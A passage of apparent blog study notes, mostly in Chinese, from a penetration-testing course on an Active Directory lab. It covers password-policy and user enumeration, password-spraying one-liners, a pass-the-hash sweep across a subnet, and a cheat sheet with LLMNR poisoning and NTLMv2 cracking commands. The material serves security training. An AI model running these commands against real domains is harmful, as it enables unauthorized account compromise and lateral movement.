   &quot;target&quot;: &#123;        &quot;host&quot;: &quot;172.16.5.5&quot;,        &quot;workgroup&quot;: &quot;&quot;    &#125;,    &quot;credentials&quot;: &#123;        &quot;user&quot;: &quot;&quot;,        &quot;password&quot;: &quot;&quot;,        &quot;random_user&quot;: &quot;yxditqpc&quot;    &#125;,    &quot;services&quot;: &#123;        &quot;SMB&quot;: &#123;            &quot;port&quot;: 445,            &quot;accessible&quot;: true        &#125;,        &quot;SMB over NetBIOS&quot;: &#123;            &quot;port&quot;: 139,            &quot;accessible&quot;: true        &#125;    &#125;,    &quot;smb_dialects&quot;: &#123;        &quot;SMB 1.0&quot;: false,        &quot;SMB 2.02&quot;: true,        &quot;SMB 2.1&quot;: true,        &quot;SMB 3.0&quot;: true,        &quot;SMB1 only&quot;: false,        &quot;Preferred dialect&quot;: &quot;SMB 3.0&quot;,        &quot;SMB signing required&quot;: true    &#125;,    &quot;sessions_possible&quot;: true,    &quot;null_session_possible&quot;: true,&lt;SNIP&gt;</code></pre><h2 id="Enumerating-Null-Session-from-Windows"><a href="#Enumerating-Null-Session-from-Windows" class="headerlink" title="Enumerating Null Session - from Windows"></a>Enumerating Null Session - from Windows</h2><p>从Windows进行这种类型的空会话攻击并不常见，但我们可以使用命令<code>net use \\host\ipc$“”/u:“”</code>从Windows机器建立一个空会话，并确认我们是否可以执行更多这种类型的攻击。</p><h4 id="Establish-a-null-session-from-windows"><a href="#Establish-a-null-session-from-windows" class="headerlink" title="Establish a null session from windows"></a>Establish a null session from windows</h4><pre><code class="cmd-session">C:\htb&gt; net use \\DC01\ipc$ &quot;&quot; /u:&quot;&quot;The command completed successfully.</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind"><a href="#Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind" class="headerlink" title="Enumerating the Password Policy - from Linux - LDAP Anonymous Bind"></a>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind</h2><p>LDAP匿名绑定允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。这是一种旧式配置，从Windows Server 2003开始，只有经过身份验证的用户才能启动LDAP请求。我们仍然不时看到这种配置，因为管理员可能需要设置一个特定的应用程序来允许匿名绑定，并提供超过预期数量的访问权限，从而允许未经身份验证的用户访问AD中的所有对象。 使用LDAP匿名绑定，我们可以使用特定于LDAP的枚举工具，如windapsearch.py、ldapsearch、ad-ldapdomaindump.py等，来提取密码策略。使用 <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>，它可能有点麻烦，但可行。获取密码策略的一个示例命令如下：</p><h4 id="Using-ldapsearch"><a href="#Using-ldapsearch" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLengthforceLogoff: -9223372036854775808lockoutDuration: -18000000000lockOutObservationWindow: -18000000000lockoutThreshold: 5maxPwdAge: -9223372036854775808minPwdAge: -864000000000minPwdLength: 8modifiedCountAtLastProm: 0nextRid: 1002pwdProperties: 1pwdHistoryLength: 24</code></pre><p>在这里，我们可以看到最小密码长度为8，锁定阈值为5，并且设置了密码复杂性（pwdProperties设置为1）。</p><h2 id="Enumerating-the-Password-Policy-from-Windows"><a href="#Enumerating-the-Password-Policy-from-Windows" class="headerlink" title="Enumerating the Password Policy - from Windows"></a>Enumerating the Password Policy - from Windows</h2><p>如果我们可以从Windows主机向域进行身份验证，我们可以使用内置的Windows二进制文件（如net.exe）来检索密码策略。我们还可以使用各种工具，如PowerView、CrackMapExec移植到Windows、SharpMapExec、SharpView等。 如果我们降落在Windows系统上，无法将工具传输到该系统，或者客户端将我们定位在Windows系统中，但无法将工具转移到该系统上，则使用内置命令会很有帮助。使用内置net.exe二进制文件的一个示例是：</p><pre><code class="cmd-session">C:\htb&gt; net accountsForce user logoff how long after time expires?:       NeverMinimum password age (days):                          1Maximum password age (days):                          UnlimitedMinimum password length:                              8Length of password history maintained:                24Lockout threshold:                                    5Lockout duration (minutes):                           30Lockout observation window (minutes):                 30Computer role:                                        SERVER</code></pre><p>在这里，我们可以收集以下信息： 密码永不过期（密码最长使用期限设置为无限制） 最小密码长度为8，因此可能使用弱密码 锁定阈值为5个错误密码 帐户被锁定30分钟</p><p>此密码策略非常适合密码喷洒。八个字符的最小值意味着我们可以尝试常见的弱密码，如Welcome1。5的锁定阈值意味着我们可以每31分钟尝试2-3次（为了安全）喷雾，而没有锁定任何账户的风险。如果一个帐户被锁定，它将在30分钟后自动解锁（无需管理员手动干预），但我们应该避免不惜一切代价锁定任何帐户。 PowerView在这方面也很方便：</p><h4 id="Using-PowerView"><a href="#Using-PowerView" class="headerlink" title="Using PowerView"></a>Using PowerView</h4><pre><code class="powershell-session">PS C:\htb&gt; import-module .\PowerView.ps1PS C:\htb&gt; Get-DomainPolicyUnicode        : @&#123;Unicode=yes&#125;SystemAccess   : @&#123;MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;                 LSAAnonymousNameLookup=0&#125;KerberosPolicy : @&#123;MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1&#125;Version        : @&#123;signature=&quot;$CHICAGO$&quot;; Revision=1&#125;RegistryValues : @&#123;MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]&#125;Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHI                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.infGPOName        : &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;GPODisplayName : Default Domain Policy</code></pre><p>PowerView为我们提供了与net accounts命令相同的输出，只是格式不同，但也显示密码复杂性已启用（PasswordComplexity&#x3D;1）。 与Linux一样，我们有许多工具可以在Windows系统上检索密码策略，无论是我们的攻击系统还是客户端提供的系统。PowerView&#x2F;SharpView总是不错的选择，CrackMapExec、SharpMapExec等也是如此。工具的选择取决于评估目标、隐形注意事项、任何防病毒或EDR以及对目标主机的其他潜在限制。让我们介绍几个例子。</p><h2 id="Analyzing-the-Password-Policy"><a href="#Analyzing-the-Password-Policy" class="headerlink" title="Analyzing the Password Policy"></a>Analyzing the Password Policy</h2><p>我们现在已经通过多种方式取消了密码策略。让我们逐一了解INLANEFREIGHT.LOCAL域的策略。</p><ul><li>最小密码长度为8（8很常见，但如今，我们看到越来越多的组织强制使用10-14个字符的密码，这可以为我们删除一些密码选项，但并不能完全缓解密码喷洒矢量）</li><li>帐户锁定阈值为5（通常会看到较低的阈值，如3，甚至根本没有设置锁定阈值）</li><li>锁定持续时间为30分钟（根据组织的不同，这可能会更高或更低），因此，如果我们意外锁定（避免！！）帐户，它将在30分钟窗口过后解锁</li><li>帐户自动解锁（在某些组织中，管理员必须手动解锁帐户）。我们从不想在执行密码喷洒时锁定帐户，但我们特别希望避免在管理员必须手动&#x2F;脚本干预并解锁数百（或数千）个帐户的组织中锁定帐户</li><li>启用了密码复杂性，这意味着用户必须选择包含以下内容的3&#x2F;4的密码：大写字母、小写字母、数字、特殊字符（Password1或Welcome1可以满足此处的“复杂性”要求，但显然仍然是弱密码）。</li></ul><h1 id="default-password-policy"><a href="#default-password-policy" class="headerlink" title="default password policy*"></a>default password policy*</h1><p>创建新域时的默认密码策略如下，许多组织从未更改过此策略：</p><table><thead><tr><th>Policy</th><th>Default Value</th></tr></thead><tbody><tr><td>Enforce password history</td><td>24 days</td></tr><tr><td>Maximum password age</td><td>42 days</td></tr><tr><td>Minimum password age</td><td>1 day</td></tr><tr><td>Minimum password length</td><td>7</td></tr><tr><td>Password must meet complexity requirements</td><td>Enabled</td></tr><tr><td>Store passwords using reversible encryption</td><td>Disabled</td></tr><tr><td>Account lockout duration</td><td>Not set</td></tr><tr><td>Account lockout threshold</td><td>0</td></tr><tr><td>Reset account lockout counter after</td><td>Not set</td></tr></tbody></table><hr><h1 id="Password-Spraying-Making-a-Target-User-List"><a href="#Password-Spraying-Making-a-Target-User-List" class="headerlink" title="-Password Spraying - Making a Target User List-"></a>-Password Spraying - Making a Target User List-</h1><h2 id="SMB-NULL-Session-to-Pull-User-List"><a href="#SMB-NULL-Session-to-Pull-User-List" class="headerlink" title="SMB NULL Session to Pull User List"></a>SMB NULL Session to Pull User List</h2><p>一些可以利用SMB NULL会话和LDAP匿名绑定的工具包括enum4linux、rpcclient和CrackMapExec等。不管使用什么工具，我们都必须进行一些过滤来清理输出，并获得一个仅包含用户名的列表，每行一个。我们可以使用带有-U标志的enum4linux来实现这一点。</p><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;administratorguestkrbtgtlab_admhtb-studentavazquezpfalconfanthonywdillardlbradfordsgageasanchezdbranchccruznjohnsonmholliday&lt;SNIP&gt;</code></pre><p>使用rpcclient匿名连接后，我们可以使用enumdomusers命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; enumdomusers user:[administrator] rid:[0x1f4]user:[guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[lab_adm] rid:[0x3e9]user:[htb-student] rid:[0x457]user:[avazquez] rid:[0x458]&lt;SNIP&gt;</code></pre><p>最后，我们可以使用带有–users标志的CrackMapExec。这是一个有用的工具，它还将显示badpwdcount（无效登录尝试），因此我们可以从列表中删除任何接近锁定阈值的帐户。它还显示了baddpwdtime，这是最后一次错误密码尝试的日期和时间，因此我们可以看到一个帐户距离重置其badpwdcount有多近。在具有多个域控制器的环境中，此值在每个域控制器上单独维护。要获得帐户错误密码尝试的准确总数，我们必须查询每个域控制器并使用值的总和，或者查询具有PDC Emulator FSMO角色的域控制器。</p><h4 id="Using-CrackMapExec-–users-Flag"><a href="#Using-CrackMapExec-–users-Flag" class="headerlink" title="Using CrackMapExec –users Flag"></a>Using CrackMapExec –users Flag</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 --usersSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez    </code></pre><h2 id="Gathering-Users-with-LDAP-Anonymous"><a href="#Gathering-Users-with-LDAP-Anonymous" class="headerlink" title="Gathering Users with LDAP Anonymous"></a>Gathering Users with LDAP Anonymous</h2><p>当我们发现LDAP匿名绑定时，我们可以使用各种工具来收集用户。一些例子包括 <a href="https://github.com/ropnop/windapsearch">windapsearch</a>和<a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>。</p><h4 id="Using-ldapsearch-1"><a href="#Using-ldapsearch-1" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></pre><p>像windapsearch这样的工具使这变得更容易（尽管我们仍然应该了解如何创建自己的LDAP搜索过滤器）。在这里，我们可以通过提供一个带有-u标志和-u标志的空白用户名来指定匿名访问，以告诉工具只检索用户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></pre><h2 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h2><p>如域的初始枚举部分所述，如果我们在内部网络中的位置根本无法访问，我们可以使用Kerbrute枚举有效的AD帐户并进行密码喷洒。 该工具使用Kerberos预身份验证，这是一种更快且可能更隐蔽的执行密码喷洒的方法。此方法不生成Windows事件ID 4625:帐户登录失败，或登录失败（经常受到监视）。该工具在没有Kerberos预身份验证的情况下向域控制器发送TGT请求，以执行用户名枚举。如果KDC以错误PRINCIPAL UNKNOWN进行响应，则用户名无效。每当KDC提示进行Kerberos预身份验证时，这表示用户名存在，工具会将其标记为有效。此用户名枚举方法不会导致登录失败，也不会锁定帐户。然而，一旦我们有了有效用户的列表并切换设备来使用此工具进行密码喷洒，失败的Kerberos预身份验证尝试将计入帐户的失败登录帐户，并可能导致帐户锁定，因此无论选择何种方法，我们都必须小心。 让我们使用格式为flast的包含48705个可能的常见用户名的jsmith.txt单词列表来尝试这种方法。统计上可能的用户名GitHub repo是此类攻击的绝佳资源，它包含各种不同的用户名列表，我们可以使用Kerbrute来枚举有效用户名。</p><pre><code class="shell-session">Tanin@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></pre><p>我们在12秒内检查了48000多个用户名，发现了50多个有效用户名。使用Ker暴力进行用户名枚举将生成事件ID 4768:请求了Kerberos身份验证票证（TGT）。只有通过组策略启用Kerberos事件日志记录时，才会触发此操作。防御者可以调整他们的SIEM工具，以寻找该事件ID的涌入，这可能表明发生了攻击。如果我们在渗透测试中成功地使用了这种方法，这将是一个很好的建议，可以添加到我们的报告中。 如果我们无法使用上面强调的任何方法创建有效的用户名列表，我们可以返回外部信息收集和搜索公司电子邮件地址，或者使用linkedin2username等工具从公司的LinkedIn页面中混合可能的用户名。</p><h2 id="Credentialed-Enumeration-to-Build-our-User-List"><a href="#Credentialed-Enumeration-to-Build-our-User-List" class="headerlink" title="Credentialed Enumeration to Build our User List"></a>Credentialed Enumeration to Build our User List</h2><p>有了有效的凭据，我们可以使用前面介绍的任何工具来构建用户列表。一种快速简单的方法是使用CrackMapExec。</p><h4 id="Using-CrackMapExec-with-Valid-Credentials"><a href="#Using-CrackMapExec-with-Valid-Credentials" class="headerlink" title="Using CrackMapExec with Valid Credentials"></a>Using CrackMapExec with Valid Credentials</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users</code></pre><h1 id="Spray-Responsibly"><a href="#Spray-Responsibly" class="headerlink" title="-Spray Responsibly-"></a>-Spray Responsibly-</h1><h4 id="Using-a-Bash-one-liner-for-the-Attack"><a href="#Using-a-Bash-one-liner-for-the-Attack" class="headerlink" title="Using a Bash one-liner for the Attack"></a>Using a Bash one-liner for the Attack</h4><pre><code class="shell-session">for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></pre><blockquote><ul><li><code>rpcclient</code>: 这是一个用于与远程主机上的 RPC（远程过程调用）服务进行交互的命令行工具。</li><li><code>-U &quot;$u%Welcome1&quot;</code>: 这部分指定了身份验证信息。<code>-U</code> 标志后面的参数包括用户名和密码。<code>$u</code> 可能是一个变量，用于存储用户名。<code>%</code> 是分隔用户名和密码的符号，然后是实际的密码 <code>Welcome1</code>。这个参数用于进行身份验证，让你能够登录到目标系统。</li><li><code>-c &quot;getusername;quit&quot;</code>: 这部分指定了在与远程主机建立连接后要执行的命令。首先，它执行了 <code>getusername</code> 命令，然后执行 <code>quit</code> 命令以退出 <code>rpcclient</code>。</li><li><code>172.16.5.5</code>: 这是远程主机的IP地址，是你要连接到的目标主机。</li></ul></blockquote><h4 id="Using-Kerbrute-for-the-Attack"><a href="#Using-Kerbrute-for-the-Attack" class="headerlink" title="Using Kerbrute for the Attack"></a>Using Kerbrute for the Attack</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1    </code></pre><p>从Linux执行密码喷洒还有多种其他方法。另一个不错的选择是使用CrackMapExec。这个通用工具接受一个用户名文本文件，在喷射攻击中使用单个密码运行。在这里，我们用grep for+过滤登录失败，并只关注有效的登录尝试，以确保滚动多行输出不会错过任何内容。</p><h4 id="Using-CrackMapExec-amp-Filtering-Logon-Failures"><a href="#Using-CrackMapExec-amp-Filtering-Logon-Failures" class="headerlink" title="Using CrackMapExec &amp; Filtering Logon Failures"></a>Using CrackMapExec &amp; Filtering Logon Failures</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 </code></pre><p>在我们的密码喷洒攻击命中一次（或多次！）后，我们可以使用CrackMapExec针对域控制器快速验证凭据。</p><h4 id="Validating-the-Credentials-with-CrackMapExec"><a href="#Validating-the-Credentials-with-CrackMapExec" class="headerlink" title="Validating the Credentials with CrackMapExec"></a>Validating the Credentials with CrackMapExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</code></pre><h2 id="Local-Administrator-Password-Reuse"><a href="#Local-Administrator-Password-Reuse" class="headerlink" title="Local Administrator Password Reuse"></a>Local Administrator Password Reuse</h2><p>如果您获得本地管理员帐户（或另一个具有特权的本地帐户）的管理访问权限和NTLM密码哈希或明文密码，则可以在网络中的多个主机上进行尝试。由于在自动化部署中使用了黄金映像，并且通过在多个主机上强制执行相同的密码可以轻松管理，因此本地管理员帐户密码的重复使用非常普遍。 CrackMapExec是尝试此攻击的方便工具。值得将目标锁定在SQL或Microsoft Exchange服务器等高价值主机上，因为它们更有可能让高特权用户登录或将其凭据永久保存在内存中。 使用本地管理员帐户时，需要考虑的一个问题是跨帐户重复使用密码或常见的密码格式。如果我们发现本地管理员帐户密码设置为唯一的桌面主机，例如$desktop%@admin123，则可能值得对服务器尝试$server%@admin123。此外，如果我们找到非标准的本地管理员帐户（如bsmith），我们可能会发现密码被重复用于类似名称的域用户帐户。同样的原则也适用于域帐户。如果我们检索名为ajones的用户的密码，那么值得在他们的管理帐户上尝试相同的密码（如果用户有），例如ajones_adm，看看他们是否在重复使用自己的密码。这在域信任情况下也很常见。我们可以获得域a中用户的有效凭据，该凭据对域B中用户名相同或相似的用户有效，反之亦然。 有时，我们可能只从本地SAM数据库中检索本地管理员帐户的NTLM哈希。在这些情况下，我们可以在整个子网（或多个子网）中喷洒NT哈希，以查找具有相同密码集的本地管理员帐户。在下面的示例中，我们尝试使用从另一台机器检索到的内置本地管理员帐户NT哈希来对&#x2F;23网络中的所有主机进行身份验证。–local auth标志将告诉该工具在每台机器上只尝试登录一次，这将消除帐户锁定的任何风险。请确保设置了此标志，这样我们就不会锁定域的内置管理员。默认情况下，如果未设置本地身份验证选项，该工具将尝试使用当前域进行身份验证，这可能会迅速导致帐户锁定。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</code></pre>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sighting In, Hunting For A User&lt;/li&gt;
&lt;li&gt;Spray Responsibly&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD_Cheat_Sheet</title>
    <link href="https://taninluv.github.io/2023/09/23/AD-Cheat-Sheet/"/>
    <id>https://taninluv.github.io/2023/09/23/AD-Cheat-Sheet/</id>
    <published>2023-09-23T04:19:05.000Z</published>
    <updated>2023-09-23T04:20:10.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code> -I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Performs a ping sweep on the specified network segment from a Linux-based host.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td></tr><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td></tr><tr><td><code>make help</code></td><td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td></tr><tr><td><code>sudo make all</code></td><td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user’s path. Making it easier to use the tool.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="LLMNR-x2F-NTB-NS-Poisoning"><a href="#LLMNR-x2F-NTB-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NTB-NS Poisoning"></a>LLMNR&#x2F;NTB-NS Poisoning</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td></tr><tr><td><code>$regkey = &quot;HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces&quot; Get-ChildItem $regkey |foreach &#123; Set-ItemProperty -Path &quot;$regkey\$($_.pschildname)&quot; -Name NetbiosOptions -Value 2 -Verbose&#125;</code></td><td>PowerShell script used to disable NBT-NS on a Windows host.</td></tr></tbody></table><h1 id="Password-Spraying-amp-Password-Policies"><a href="#Password-Spraying-amp-Password-Policies" class="headerlink" title="Password Spraying &amp; Password Policies"></a>Password Spraying &amp; Password Policies</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>#!/bin/bash  for x in &#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;     do echo $x; done</code></td><td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5</code></td><td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; querydominfo</code></td><td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux  -P 172.16.5.5</code></td><td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength</code></td><td>Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host.</td></tr><tr><td><code>net accounts</code></td><td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</code></td><td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5  rpcclient $&gt; enumdomuser</code></td><td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 --users</code></td><td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></td><td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td></tr><tr><td><code>./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></td><td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></td><td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output 